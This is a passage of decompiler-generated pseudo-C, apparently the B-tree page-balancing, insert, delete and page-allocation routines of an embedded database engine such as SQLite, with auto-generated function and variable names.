  int v102[5]; // [esp+44h] [ebp-88h] BYREF
  int v103[5]; // [esp+58h] [ebp-74h] BYREF
  int v104[3]; // [esp+6Ch] [ebp-60h] BYREF
  int v105; // [esp+78h] [ebp-54h]
  _BYTE *v106; // [esp+7Ch] [ebp-50h]
  int v107; // [esp+80h] [ebp-4Ch]
  unsigned int v108; // [esp+84h] [ebp-48h] BYREF
  int v109; // [esp+88h] [ebp-44h]
  int *v110; // [esp+8Ch] [ebp-40h]
  int v111; // [esp+90h] [ebp-3Ch]
  int v112; // [esp+94h] [ebp-38h]
  int *v113; // [esp+98h] [ebp-34h]
  int v114; // [esp+9Ch] [ebp-30h]
  int v115; // [esp+A0h] [ebp-2Ch]
  int v116; // [esp+A4h] [ebp-28h]
  int *v117; // [esp+A8h] [ebp-24h]
  void *v118; // [esp+ACh] [ebp-20h]
  int v119; // [esp+B0h] [ebp-1Ch]
  int v120; // [esp+B4h] [ebp-18h]
  int v121; // [esp+B8h] [ebp-14h] BYREF
  int v122; // [esp+BCh] [ebp-10h] BYREF
  int v123; // [esp+C0h] [ebp-Ch]
  int v124; // [esp+C4h] [ebp-8h]
  int v125; // [esp+D4h] [ebp+8h]
  int v126; // [esp+D8h] [ebp+Ch]

  v4 = a2;
  v6 = *(int **)(a2 + 60);
  v120 = 0;
  v111 = 0;
  v116 = 0;
  v110 = 0;
  v105 = 0;
  v109 = 0;
  v117 = v6;
  if ( !a3 )
    return 7;
  v8 = *(unsigned __int16 *)(a2 + 16);
  v9 = *(unsigned __int8 *)(a2 + 1);
  v10 = v9 + v8;
  if ( v9 + v8 >= 2 )
  {
    v115 = 3;
    if ( a1 )
    {
      if ( a1 == v10 )
        v114 = v10 - 2;
      else
        v114 = a1 - 1;
    }
    else
    {
      v114 = 0;
    }
    v10 = 2;
  }
  else
  {
    v114 = 0;
    v115 = v10 + 1;
  }
  v11 = v114 - v9 + v10;
  v66 = v11 == v8;
  v12 = *(_DWORD *)(a2 + 64);
  if ( v66 )
  {
    v106 = (_BYTE *)(*(unsigned __int8 *)(a2 + 5) + v12 + 8);
  }
  else
  {
    v13 = (_BYTE *)(v12 + *(unsigned __int16 *)(a2 + 12) + 2 * v11);
    HIBYTE(v14) = *v13;
    LOBYTE(v14) = v13[1];
    v106 = (_BYTE *)(v12 + (unsigned __int16)(*(_WORD *)(a2 + 18) & v14));
  }
  v108 = sub_10059C56(v106);
  v15 = &v104[v10];
  v122 = sub_100620C4(v117, v15, v108);
  if ( v122 )
  {
LABEL_22:
    memset(v104, 0, 4 * v10 + 4);
    goto LABEL_127;
  }
  v124 = v10 + v114;
  while ( 1 )
  {
    v111 += *(unsigned __int8 *)(*v15 + 1) + *(unsigned __int16 *)(*v15 + 16) + 1;
    v16 = v10--;
    --v124;
    if ( !v16 )
      break;
    if ( v124 == *(unsigned __int16 *)(v4 + 24) && *(_BYTE *)(v4 + 1) )
    {
      v17 = *(_BYTE **)(v4 + 20);
      v102[v10 + 3] = (int)v17;
      v108 = sub_10059C56(v17);
      v103[v10] = (unsigned __int16)sub_1006190B(v4, (int)v17);
      *(_BYTE *)(v4 + 1) = 0;
    }
    else
    {
      v18 = *(_DWORD *)(v4 + 64);
      v19 = (_BYTE *)(v18 + *(unsigned __int16 *)(v4 + 12) + 2 * (v10 + v114 - *(unsigned __int8 *)(v4 + 1)));
      LOBYTE(v20) = v19[1];
      HIBYTE(v20) = *v19;
      v21 = (_BYTE *)((unsigned __int16)(*(_WORD *)(v4 + 18) & v20) + v18);
      v102[v10 + 3] = (int)v21;
      v108 = sub_10059C56(v21);
      v22 = sub_1006190B(v4, (int)v21);
      v23 = v114;
      v103[v10] = v22;
      sub_1006491B(v4, v10 + v23 - *(unsigned __int8 *)(v4 + 1), v22, &v122);
      v4 = a2;
    }
    v15 = &v104[v10];
    v122 = sub_100620C4(v117, v15, v108);
    if ( v122 )
      goto LABEL_22;
  }
  v24 = *((unsigned __int16 *)v117 + 10);
  v118 = (void *)(v24 + 80);
  v25 = (v111 + 3) & 0xFFFFFFFC;
  v26 = sub_10058CB9(v24 + v115 * (v24 + 80) + 6 * v25);
  v109 = v26;
  if ( !v26 )
  {
    v122 = 7;
    goto LABEL_127;
  }
  v27 = v104[0];
  v123 = 0;
  v112 = v26 + 4 * v25;
  v121 = v112 + 2 * v25;
  v111 = (unsigned __int16)(4 * *(unsigned __int8 *)(v104[0] + 3));
  v107 = *(unsigned __int8 *)(v104[0] + 4);
  if ( v115 <= 0 )
    goto LABEL_46;
  v113 = 0;
  do
  {
    v28 = (int)v113 + *((unsigned __int16 *)v117 + 10) + v121;
    v29 = &v104[v123];
    v94 = (const void *)*v29;
    v102[v123] = v28;
    memcpy((void *)v28, v94, 0x4Cu);
    v30 = v117;
    *(_DWORD *)(v28 + 64) = v28 + 76;
    memcpy((void *)(v28 + 76), *(const void **)(*v29 + 64), *((unsigned __int16 *)v30 + 10));
    v31 = *(unsigned __int16 *)(v28 + 16);
    v32 = *(unsigned __int8 *)(v28 + 1);
    v119 = 0;
    v33 = v32 + v31;
    if ( v33 <= 0 )
      goto LABEL_36;
    do
    {
      v34 = *(unsigned __int8 *)(v28 + 1) - 1;
      v35 = v119;
      if ( v34 < 0 )
      {
LABEL_34:
        v37 = *(_DWORD *)(v28 + 64);
        v38 = (_BYTE *)(v37 + *(unsigned __int16 *)(v28 + 12) + 2 * v35);
        LOBYTE(v39) = v38[1];
        HIBYTE(v39) = *v38;
        v40 = v37 + (unsigned __int16)(*(_WORD *)(v28 + 18) & v39);
        goto LABEL_35;
      }
      v124 = v28 + 8 * v34 + 20;
      while ( 1 )
      {
        v36 = *(unsigned __int16 *)(v124 + 4);
        if ( v36 <= v35 )
          break;
LABEL_33:
        v124 -= 8;
        if ( --v34 < 0 )
          goto LABEL_34;
      }
      if ( v36 != v35 )
      {
        --v35;
        goto LABEL_33;
      }
      v40 = *(_DWORD *)v124;
LABEL_35:
      *(_DWORD *)(v109 + 4 * v120) = v40;
      v41 = sub_1006190B(v28, v40);
      v42 = v120++;
      v43 = ++v119 < v33;
      *(_WORD *)(v112 + 2 * v42) = v41;
    }
    while ( v43 );
LABEL_36:
    if ( v123 < v115 - 1 && !v107 )
    {
      v44 = v103[v123];
      v45 = (unsigned __int16 *)(v112 + 2 * v120);
      v46 = v110;
      v47 = v121;
      *v45 = v44;
      v110 = (int *)((char *)v110 + v44);
      v95 = (const void *)v102[v123 + 3];
      v124 = (int)v46 + v47;
      memcpy((char *)v46 + v47, v95, v44);
      v48 = (void **)(v109 + 4 * v120);
      v49 = v111;
      *v48 = (void *)(v124 + (unsigned __int16)v111);
      *v45 -= v49;
      if ( *(_BYTE *)(v28 + 3) )
      {
        if ( *v45 < 4u )
          *v45 = 4;
      }
      else
      {
        memcpy(*v48, (const void *)(*(_DWORD *)(v28 + 64) + 8), 4u);
      }
      ++v120;
    }
    ++v123;
    v113 = (int *)((char *)v113 + (_DWORD)v118);
  }
  while ( v123 < v115 );
  v27 = v104[0];
LABEL_46:
  v121 = *((unsigned __int16 *)v117 + 11) + (unsigned __int16)v111 - 12;
  v50 = 0;
  v51 = 0;
  v52 = 0;
  if ( v120 > 0 )
  {
    while ( 1 )
    {
      v53 = *(unsigned __int16 *)(v112 + 2 * v51);
      v50 += v53 + 2;
      if ( v50 > v121 )
      {
        v103[v52] = v50 - v53;
        v50 = 0;
        v66 = v107 == 0;
        *(_DWORD *)&v101[4 * v52 + 4] = v51;
        if ( !v66 )
          --v51;
        if ( ++v52 > 4 )
          break;
      }
      if ( ++v51 >= v120 )
        goto LABEL_52;
    }
LABEL_58:
    v122 = 11;
    goto LABEL_127;
  }
LABEL_52:
  v103[v52] = v50;
  *(_DWORD *)&v101[4 * v52 + 4] = v120;
  v54 = (void *)(v52 + 1);
  v118 = v54;
  v123 = (int)v54 - 1;
  if ( (int)v54 - 1 <= 0 )
    goto LABEL_61;
  while ( 2 )
  {
    v55 = v112;
    v56 = v103[v123];
    v113 = &v103[v123];
    v110 = &v102[v123 + 4];
    v57 = &v101[4 * v123];
    v124 = *v110;
    v121 = (int)v57;
    while ( 2 )
    {
      v58 = *(_DWORD *)v57 - 1;
      v59 = *(_DWORD *)v57 - v107;
      if ( !v56 )
      {
LABEL_57:
        v55 = v112;
        v56 += *(unsigned __int16 *)(v112 + 2 * v59) + 2;
        v124 += -2 - *(unsigned __int16 *)(v112 + 2 * v58);
        --*(_DWORD *)v57;
        continue;
      }
      break;
    }
    if ( *(unsigned __int16 *)(v112 + 2 * v59) + v56 + 2 <= v124 - *(unsigned __int16 *)(v55 + 2 * v58) - 2 )
    {
      v57 = (char *)v121;
      goto LABEL_57;
    }
    v43 = --v123 <= 0;
    v60 = v110;
    *v113 = v56;
    *v60 = v124;
    if ( !v43 )
      continue;
    break;
  }
  v27 = v104[0];
  v54 = v118;
LABEL_61:
  if ( *(_DWORD *)(v27 + 72) <= 1u )
    goto LABEL_58;
  v61 = **(unsigned __int8 **)(v27 + 64);
  v62 = 0;
  v124 = v61;
  if ( (int)v54 > 0 )
  {
    while ( 2 )
    {
      if ( v62 >= v115 )
      {
        v122 = sub_10063F4D((int)v117, &v121, (int *)&v108, v108, 0);
        if ( v122 )
          goto LABEL_127;
        v67 = v121;
        ++v116;
        v66 = *((_BYTE *)v117 + 18) == 0;
        v103[v62] = v121;
        if ( !v66 )
        {
          sub_100616A8(*(_DWORD *)(v67 + 72), v117, 5, *(_DWORD *)(v4 + 72), &v122);
          v66 = v122 == 0;
          goto LABEL_68;
        }
      }
      else
      {
        v63 = &v104[v62];
        v64 = *v63;
        *v63 = 0;
        v98 = *(_DWORD *)(v64 + 68);
        v103[v62] = v64;
        v121 = v64;
        v65 = sub_1006EFC8(v98);
        ++v116;
        v122 = v65;
        v66 = v65 == 0;
LABEL_68:
        if ( !v66 )
          goto LABEL_127;
      }
      if ( ++v62 >= (int)v54 )
        break;
      continue;
    }
  }
  if ( v62 >= v115 )
  {
LABEL_74:
    v68 = 0;
    if ( (int)v54 - 1 > 0 )
    {
      do
      {
        v69 = &v103[(_DWORD)v68];
        v70 = *v69;
        v121 = *(_DWORD *)(*v69 + 72);
        v113 = v68;
        v110 = (int *)((char *)v68 + 1);
        v119 = (int)v68 + 1;
        if ( (int)v68 + 1 < (int)v54 )
        {
          do
          {
            v108 = *(_DWORD *)(v103[v119] + 72);
            if ( v108 < v121 )
            {
              v113 = (int *)v119;
              v121 = v108;
            }
            ++v119;
          }
          while ( v119 < (int)v54 );
          if ( (int)v113 > (int)v68 )
          {
            v71 = &v103[(_DWORD)v113];
            *v69 = *v71;
            *v71 = v70;
          }
        }
        v68 = v110;
      }
      while ( (int)v110 < (int)v54 - 1 );
    }
    v72 = (int *)v102[v116 + 4];
    v73 = v72[18];
    v113 = v72;
    sub_10059C70(v106, v73);
    v74 = 0;
    v123 = 0;
    if ( v116 > 0 )
    {
      do
      {
        v75 = 4 * v123;
        v76 = v103[v123];
        sub_10061FAA(v76, v124);
        v77 = *(_DWORD *)&v101[v75 + 4];
        sub_10064B22(v76, v77 - v74, v109 + 4 * v74, v112 + 2 * v74);
        v74 = v77;
        if ( v77 < v120 )
        {
          v118 = *(void **)(v109 + 4 * v77);
          v78 = *(_WORD *)(v112 + 2 * v77);
          v121 = v78;
          v79 = (unsigned __int16)v111 + v78;
          v66 = *(_BYTE *)(v76 + 3) == 0;
          v106 = (_BYTE *)(a3 + v105);
          if ( v66 )
          {
            memcpy((void *)(*(_DWORD *)(v76 + 64) + 8), v118, 4u);
          }
          else if ( v107 )
          {
            --v74;
            sub_100617C9((int)v99, (_BYTE *)v76, *(_DWORD *)(v109 + 4 * v74));
            v118 = v106;
            v79 = sub_10059996(v106 + 4, v100) + 4;
            v106 = 0;
          }
          else
          {
            v118 = (char *)v118 - 4;
            if ( (_WORD)v121 == 4 )
              v79 = (unsigned __int16)sub_1006190B(a2, (int)v118);
          }
          v105 += v79;
          if ( v122 )
            goto LABEL_127;
          sub_100649BE(v106, a2, v114, (int)v118, v79, *(_DWORD *)(v76 + 72), &v122);
          if ( v122 )
            goto LABEL_127;
          ++v74;
          ++v114;
        }
        ++v123;
      }
      while ( v123 < v116 );
      v4 = a2;
      v72 = v113;
    }
    if ( (v124 & 8) == 0 )
      memcpy((void *)(v72[16] + 8), (const void *)(*(_DWORD *)(*(_DWORD *)&v101[4 * v115 + 20] + 64) + 8), 4u);
    v80 = v103[0];
    if ( !a4 || *(_WORD *)(v4 + 16) || *(unsigned __int8 *)(v4 + 5) > (unsigned int)*(_WORD *)(v103[0] + 14) )
    {
      if ( *((_BYTE *)v117 + 18) )
      {
        v81 = *(unsigned __int8 *)(v102[0] + 1);
        v126 = v103[0];
        v82 = v102[0];
        v83 = v81 + *(unsigned __int16 *)(v102[0] + 16);
        v105 = v102[0];
        v124 = v81;
        if ( v81 )
          v125 = *(unsigned __int16 *)(v102[0] + 24);
        else
          v125 = -1;
        v84 = 0;
        v119 = 0;
        v118 = 0;
        v123 = 0;
        if ( v120 > 0 )
        {
          v121 = 0;
          do
          {
            v85 = 0;
            if ( v84 == v83 )
            {
              v86 = v107 == 0;
              do
              {
                v82 = v102[++v119];
                v87 = *(_BYTE *)(v82 + 1);
                v83 = v84 + v86 + *(unsigned __int16 *)(v82 + 16) + v87;
                v105 = v82;
                if ( v87 )
                {
                  v124 = v87;
                  v125 = v84 + v86 + *(unsigned __int16 *)(v82 + 24);
                }
                v85 = v107 == 0;
              }
              while ( v84 == v83 );
            }
            if ( v84 == v125 )
            {
              v85 = 1;
              if ( --v124 > 0 )
                ++v125;
            }
            if ( v84 != *(_DWORD *)&v101[v121 + 4]
              || (v118 = (char *)v118 + 1, v121 = 4 * (_DWORD)v118, v126 = v103[(_DWORD)v118], v107) )
            {
              if ( v85 || *(_DWORD *)(v82 + 72) != *(_DWORD *)(v126 + 72) )
              {
                if ( !(_WORD)v111 )
                {
                  v96 = *(_DWORD *)(v126 + 72);
                  v88 = sub_10059C56(*(_BYTE **)(v109 + 4 * v84));
                  sub_100616A8(v88, v117, 5, v96, &v122);
                }
                if ( *(_WORD *)(v112 + 2 * v84) > *(_WORD *)(v126 + 10) )
                {
                  sub_100619BB(&v122, v126, *(_DWORD *)(v109 + 4 * v123));
                  v82 = v105;
                  v84 = v123;
                }
              }
            }
            v123 = ++v84;
          }
          while ( v84 < v120 );
        }
        if ( !(_WORD)v111 )
        {
          for ( i = 0; i < v116; ++i )
          {
            v90 = v103[i];
            v97 = *(_DWORD *)(v90 + 72);
            v91 = sub_10059C56((_BYTE *)(*(_DWORD *)(v90 + 64) + 8));
            sub_100616A8(v91, v117, 5, v97, &v122);
          }
        }
      }
    }
    else
    {
      sub_10064D0D(v103[0], v4, &v122);
      sub_10064625(v80, &v122);
    }
  }
  else
  {
    while ( 1 )
    {
      sub_10064625(v104[v62], &v122);
      if ( v122 )
        break;
      sub_100620FB(v104[v62]);
      v104[v62++] = 0;
      if ( v62 >= v115 )
      {
        v4 = a2;
        goto LABEL_74;
      }
    }
  }
LABEL_127:
  sub_10058D7F(v109);
  for ( j = 0; j < v115; ++j )
    sub_100620FB(v104[j]);
  for ( k = 0; k < v116; ++k )
    sub_100620FB(v103[k]);
  return v122;
}
// 10064DB0: using guessed type int var_60[3];
// 10064DB0: using guessed type int var_74[5];
// 10064DB0: using guessed type char var_BC[8];

//----- (1006570A) --------------------------------------------------------
int __usercall sub_1006570A@<eax>(int a1@<eax>, int *a2)
{
  int v3; // ebx
  int v4; // edi
  int v5; // eax
  int v7; // [esp-4h] [ebp-20h]
  int v8; // [esp+10h] [ebp-Ch] BYREF
  int v9; // [esp+14h] [ebp-8h] BYREF
  int v10; // [esp+18h] [ebp-4h] BYREF

  v3 = *(_DWORD *)(a1 + 60);
  v7 = *(_DWORD *)(a1 + 68);
  v4 = 0;
  v8 = 0;
  v9 = 0;
  v10 = sub_1006EFC8(v7);
  if ( v10 )
    goto LABEL_5;
  v5 = sub_10063F4D(v3, &v8, &v9, *(_DWORD *)(a1 + 72), 0);
  v4 = v8;
  v10 = v5;
  sub_10064D0D(a1, v8, &v10);
  if ( *(_BYTE *)(v3 + 18) )
    sub_100616A8(v9, (int *)v3, 5, *(_DWORD *)(a1 + 72), &v10);
  if ( v10 )
  {
LABEL_5:
    *a2 = 0;
    sub_100620FB(v4);
    return v10;
  }
  else
  {
    memcpy((void *)(v4 + 20), (const void *)(a1 + 20), 8 * *(unsigned __int8 *)(a1 + 1));
    *(_BYTE *)(v4 + 1) = *(_BYTE *)(a1 + 1);
    sub_10061FAA(a1, **(_BYTE **)(v4 + 64) & 0xF7);
    sub_10059C70((_BYTE *)(*(unsigned __int8 *)(a1 + 5) + *(_DWORD *)(a1 + 64) + 8), v9);
    *a2 = v4;
    return 0;
  }
}

//----- (100657DA) --------------------------------------------------------
int __cdecl sub_100657DA(int a1)
{
  int v1; // ebx
  int v2; // eax
  int v3; // esi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  _DWORD *v7; // edi
  int v8; // eax
  int v10; // [esp-4h] [ebp-38h]
  char v11[16]; // [esp+Ch] [ebp-28h] BYREF
  int v12; // [esp+1Ch] [ebp-18h]
  int v13; // [esp+20h] [ebp-14h]
  int v14; // [esp+24h] [ebp-10h]
  int v15; // [esp+28h] [ebp-Ch]
  _DWORD *v16; // [esp+2Ch] [ebp-8h]
  int v17; // [esp+30h] [ebp-4h]

  v1 = a1;
  v2 = 2 * *(unsigned __int16 *)(*(_DWORD *)(a1 + 4) + 22) / 3;
  v17 = 0;
  v16 = 0;
  v13 = v2;
  while ( 1 )
  {
    v3 = *(__int16 *)(v1 + 84);
    v4 = *(_DWORD *)(v1 + 4 * v3 + 88);
    v14 = v4;
    if ( v3 )
      break;
    if ( !*(_BYTE *)(v4 + 1) )
      goto LABEL_20;
    v17 = sub_1006570A(v4, (int *)(v1 + 92));
    if ( v17 )
      goto LABEL_20;
    *(_WORD *)(v1 + 84) = 1;
    *(_WORD *)(v1 + 168) = 0;
    *(_WORD *)(v1 + 170) = 0;
LABEL_19:
    if ( v17 )
      goto LABEL_20;
  }
  if ( *(_BYTE *)(v4 + 1) || *(unsigned __int16 *)(v4 + 14) > v13 )
  {
    v5 = *(_DWORD *)(v1 + 4 * v3 + 84);
    v6 = *(unsigned __int16 *)(v1 + 2 * v3 + 166);
    v10 = *(_DWORD *)(v5 + 68);
    v12 = v5;
    v15 = v6;
    v17 = sub_1006EFC8(v10);
    if ( !v17 )
    {
      if ( *(_BYTE *)(v14 + 4)
        && *(_BYTE *)(v14 + 1) == 1
        && *(_WORD *)(v14 + 24) == *(_WORD *)(v14 + 16)
        && *(_DWORD *)(v5 + 72) != 1
        && *(unsigned __int16 *)(v5 + 16) == v15 )
      {
        v1 = a1;
        v17 = sub_10064BC8(v14, v5, (int)v11);
      }
      else
      {
        v7 = (_DWORD *)sub_10066DBF(*(unsigned __int16 *)(*(_DWORD *)(v1 + 4) + 20));
        v17 = sub_10064DB0(v15, v12, (int)v7, v3 == 1);
        if ( v16 )
          sub_10066DE3(v16);
        v16 = v7;
      }
    }
    v8 = v14;
    *(_BYTE *)(v14 + 1) = 0;
    sub_100620FB(v8);
    --*(_WORD *)(v1 + 84);
    goto LABEL_19;
  }
LABEL_20:
  if ( v16 )
    sub_10066DE3(v16);
  return v17;
}
// 100657DA: using guessed type char var_28[16];

//----- (10065921) --------------------------------------------------------
int __usercall sub_10065921@<eax>(
        int a1@<eax>,
        int a2@<ebx>,
        void *a3,
        signed __int64 a4,
        void *a5,
        int a6,
        int a7,
        int a8)
{
  bool v8; // zf
  int v10; // eax
  int result; // eax
  int v12; // esi
  int v13; // eax
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  _WORD *v17; // eax
  int v18; // edi
  int v19; // ecx
  _BYTE *v20; // eax
  __int16 v21; // dx
  _DWORD *v22; // edx
  void *v23; // [esp+Ch] [ebp-10h]
  int v24; // [esp+10h] [ebp-Ch] BYREF
  int v25; // [esp+14h] [ebp-8h] BYREF
  _DWORD *v26; // [esp+18h] [ebp-4h] BYREF

  v24 = 0;
  v8 = *(_BYTE *)(a2 + 67) == 3;
  v10 = *(_DWORD *)(*(_DWORD *)a2 + 4);
  v25 = a1;
  v26 = (_DWORD *)v10;
  if ( v8 )
    return *(_DWORD *)(a2 + 80);
  result = sub_10061587(v10, *(_DWORD *)(a2 + 20), a2);
  if ( !result && (a1 || (result = sub_100615CB(a2, (unsigned __int8 *)a3, a4, a8, &v25)) == 0) )
  {
    v12 = *(_DWORD *)(a2 + 4 * *(__int16 *)(a2 + 84) + 88);
    v13 = (int)v26;
    if ( !v26[19] )
    {
      v14 = sub_10066DBF(*((unsigned __int16 *)v26 + 10));
      v15 = (int)v26;
      v26[19] = v14;
      v13 = v15;
    }
    v16 = *(_DWORD *)(v13 + 76);
    v23 = (void *)v16;
    if ( !v16 )
      return 7;
    result = sub_100646FC(v12, v16, a3, a4, a5, a6, a7, &v24);
    v26 = (_DWORD *)result;
    if ( !result )
    {
      v17 = (_WORD *)(a2 + 2 * *(__int16 *)(a2 + 84) + 168);
      v18 = (unsigned __int16)*v17;
      if ( v25 )
      {
        if ( v25 < 0 && *(_WORD *)(v12 + 16) )
        {
          ++*v17;
          v18 = *(unsigned __int16 *)(a2 + 2 * *(__int16 *)(a2 + 84) + 168);
        }
        goto LABEL_20;
      }
      result = sub_1006EFC8(*(_DWORD *)(v12 + 68));
      if ( !result )
      {
        v19 = *(_DWORD *)(v12 + 64);
        v20 = (_BYTE *)(v19 + *(unsigned __int16 *)(v12 + 12) + 2 * v18);
        HIBYTE(v21) = *v20;
        LOBYTE(v21) = v20[1];
        v22 = (_DWORD *)(v19 + (unsigned __int16)(*(_WORD *)(v12 + 18) & v21));
        v8 = *(_BYTE *)(v12 + 3) == 0;
        v26 = v22;
        if ( v8 )
          memcpy(v23, v22, 4u);
        v25 = (unsigned __int16)sub_1006190B(v12, (int)v26);
        v26 = (_DWORD *)sub_1006463B(v12, (int)v26);
        sub_1006491B(v12, v18, (unsigned __int16)v25, (int *)&v26);
        result = (int)v26;
        if ( !v26 )
        {
LABEL_20:
          sub_100649BE(0, v12, v18, (int)v23, v24, 0, (int *)&v26);
          result = (int)v26;
          *(_WORD *)(a2 + 62) = 0;
          *(_BYTE *)(a2 + 66) = 0;
          if ( !result )
          {
            if ( *(_BYTE *)(v12 + 1) )
            {
              result = sub_100657DA(a2);
              *(_BYTE *)(*(_DWORD *)(a2 + 4 * *(__int16 *)(a2 + 84) + 88) + 1) = 0;
              *(_BYTE *)(a2 + 67) = 0;
            }
          }
        }
      }
    }
  }
  return result;
}

//----- (10065AD2) --------------------------------------------------------
int __usercall sub_10065AD2@<eax>(int a1@<ebx>)
{
  int v1; // eax
  unsigned __int16 v2; // dx
  bool v3; // cf
  int v4; // esi
  int v5; // eax
  int v6; // edi
  _BYTE *v7; // eax
  __int16 v8; // cx
  bool v9; // zf
  int result; // eax
  unsigned __int16 v11; // ax
  int v12; // esi
  int v13; // ecx
  int v14; // edi
  int v15; // eax
  int v16; // edi
  _BYTE *v17; // eax
  int v18; // eax
  _BYTE *v19; // ecx
  int v20; // esi
  __int16 v21; // cx
  int v22; // eax
  int v23; // [esp-4h] [ebp-2Ch]
  int v24; // [esp+Ch] [ebp-1Ch] BYREF
  int v25; // [esp+10h] [ebp-18h]
  int v26; // [esp+14h] [ebp-14h]
  int v27; // [esp+18h] [ebp-10h]
  _BYTE *v28; // [esp+1Ch] [ebp-Ch]
  int v29; // [esp+20h] [ebp-8h]
  int v30; // [esp+24h] [ebp-4h] BYREF

  v28 = *(_BYTE **)(*(_DWORD *)a1 + 4);
  v1 = *(__int16 *)(a1 + 84);
  v2 = *(_WORD *)(a1 + 2 * v1 + 168);
  v3 = v2 < *(_WORD *)(*(_DWORD *)(a1 + 4 * v1 + 88) + 16);
  v27 = v1;
  if ( !v3 || *(_BYTE *)(a1 + 67) != 1 )
    return 1;
  v4 = *(_DWORD *)(a1 + 4 * v1 + 88);
  v5 = *(unsigned __int16 *)(v4 + 12);
  v6 = *(_DWORD *)(v4 + 64);
  v26 = v2;
  v7 = (_BYTE *)(v6 + v5 + 2 * v2);
  HIBYTE(v8) = *v7;
  v25 = v4;
  LOBYTE(v8) = v7[1];
  v9 = *(_BYTE *)(v4 + 3) == 0;
  v29 = v6 + (unsigned __int16)(*(_WORD *)(v4 + 18) & v8);
  if ( !v9 || (result = sub_10063E4D(a1, &v24)) == 0 )
  {
    result = sub_10061587((int)v28, *(_DWORD *)(a1 + 20), a1);
    if ( !result )
    {
      result = sub_1006EFC8(*(_DWORD *)(v4 + 68));
      if ( !result )
      {
        v30 = sub_1006463B(v4, v29);
        v11 = sub_1006190B(v4, v29);
        sub_1006491B(v4, v26, v11, &v30);
        result = v30;
        if ( !v30 )
        {
          if ( *(_BYTE *)(v4 + 3) )
            goto LABEL_14;
          v12 = *(_DWORD *)(a1 + 4 * *(__int16 *)(a1 + 84) + 88);
          v13 = *(unsigned __int16 *)(v12 + 12);
          v14 = *(_DWORD *)(v12 + 64);
          v24 = *(_DWORD *)(*(_DWORD *)(a1 + 4 * v27 + 92) + 72);
          v15 = v14 + v13 + 2 * *(unsigned __int16 *)(v12 + 16);
          BYTE1(v13) = *(_BYTE *)(v15 - 2);
          LOBYTE(v13) = *(_BYTE *)(v15 - 1);
          v29 = v14 + (unsigned __int16)(*(_WORD *)(v12 + 18) & v13);
          v16 = (unsigned __int16)sub_1006190B(v12, v29);
          v17 = v28;
          v9 = *((_DWORD *)v28 + 19) == 0;
          v30 = v16;
          if ( v9 )
          {
            v18 = sub_10066DBF(*((unsigned __int16 *)v28 + 10));
            v19 = v28;
            v16 = v30;
            *((_DWORD *)v28 + 19) = v18;
            v17 = v19;
          }
          v23 = *(_DWORD *)(v12 + 68);
          v28 = (_BYTE *)*((_DWORD *)v17 + 19);
          v30 = sub_1006EFC8(v23);
          if ( !v30 )
            sub_100649BE(v28, v25, v26, v29 - 4, v16 + 4, v24, &v30);
          sub_1006491B(v12, *(unsigned __int16 *)(v12 + 16) - 1, v16, &v30);
          result = v30;
          if ( !v30 )
          {
LABEL_14:
            v20 = sub_100657DA(a1);
            if ( !v20 )
            {
              if ( *(__int16 *)(a1 + 84) <= v27 )
                goto LABEL_18;
              do
              {
                v21 = *(_WORD *)(a1 + 84);
                v22 = *(_DWORD *)(a1 + 4 * v21 + 88);
                *(_WORD *)(a1 + 84) = v21 - 1;
                sub_100620FB(v22);
              }
              while ( *(__int16 *)(a1 + 84) > v27 );
              v20 = sub_100657DA(a1);
              if ( !v20 )
LABEL_18:
                sub_10063878(a1);
            }
            return v20;
          }
        }
      }
    }
  }
  return result;
}

//----- (10065CC1) --------------------------------------------------------
int __cdecl sub_10065CC1(int a1, unsigned int *a2, int a3)
{
  int v3; // esi
  unsigned int v4; // eax
  unsigned int v5; // edi
  int result; // eax
  int v7; // edi
  int v8; // edi
  int v9; // esi
  int v10; // [esp+Ch] [ebp-18h] BYREF
  int v11; // [esp+10h] [ebp-14h] BYREF
  unsigned int v12; // [esp+14h] [ebp-10h] BYREF
  int v13; // [esp+18h] [ebp-Ch] BYREF
  int v14; // [esp+1Ch] [ebp-8h] BYREF
  unsigned int v15; // [esp+20h] [ebp-4h] BYREF

  v3 = *(_DWORD *)(a1 + 4);
  if ( !*(_BYTE *)(v3 + 18) )
  {
    result = sub_10063F4D(v3, &v14, (int *)&v15, 1u, 0);
    if ( result )
      return result;
    v8 = v14;
    goto LABEL_25;
  }
  sub_1006618B(a1, 4, (int *)&v15);
  ++v15;
  while ( 1 )
  {
    v4 = sub_1006166F(v3, v15);
    v5 = v15;
    if ( v15 != v4 && v15 != 0x40000000 / *(unsigned __int16 *)(v3 + 20) + 1 )
      break;
    ++v15;
  }
  result = sub_10063F4D(v3, &v10, &v11, v15, 1);
  v14 = result;
  if ( !result )
  {
    if ( v11 == v5 )
    {
      v8 = v10;
      goto LABEL_20;
    }
    LOBYTE(v13) = 0;
    v12 = 0;
    sub_100620FB(v10);
    result = sub_10062069((int *)v3, v5, &v14, 0);
    if ( result )
      return result;
    v7 = sub_1006175A(v5, (int *)v3, &v13, (int *)&v12);
    if ( (_BYTE)v13 == 1 || (_BYTE)v13 == 2 )
      v7 = 11;
    if ( v7 )
    {
      sub_100620FB(v14);
      return v7;
    }
    v7 = sub_10062D4C(v14, (int *)v3, v11, v13, v12, 0);
    sub_100620FB(v14);
    if ( v7 )
      return v7;
    result = sub_10062069((int *)v3, v15, &v14, 0);
    if ( !result )
    {
      v8 = v14;
      v14 = sub_1006EFC8(*(_DWORD *)(v14 + 68));
      if ( v14 )
      {
LABEL_18:
        sub_100620FB(v8);
        return v14;
      }
LABEL_20:
      sub_100616A8(v15, (int *)v3, 1, 0, &v14);
      if ( v14 )
        goto LABEL_18;
      v9 = sub_100661BB(a1, 4, v15);
      if ( v9 )
      {
        sub_100620FB(v8);
        return v9;
      }
LABEL_25:
      sub_10061FAA(v8, a3 | 8);
      sub_1006EC75(*(_DWORD *)(v8 + 68));
      *a2 = v15;
      return 0;
    }
  }
  return result;
}

//----- (10065E71) --------------------------------------------------------
int __usercall sub_10065E71@<eax>(int a1@<eax>, unsigned int *a2, int a3)
{
  int v4; // esi

  sub_10068C39(a1);
  v4 = sub_10065CC1(a1, a2, a3);
  sub_10068CA7(a1);
  return v4;
}

//----- (10065E9B) --------------------------------------------------------
int __cdecl sub_10065E9B(int *a1, unsigned int a2, int a3, _DWORD *a4)
{
  unsigned int v4; // eax
  int result; // eax
  int v6; // esi
  int v7; // edi
  int v8; // ecx
  _BYTE *v9; // eax
  __int16 v10; // bx
  _BYTE *v11; // ebx
  int v12; // eax
  int v13; // eax
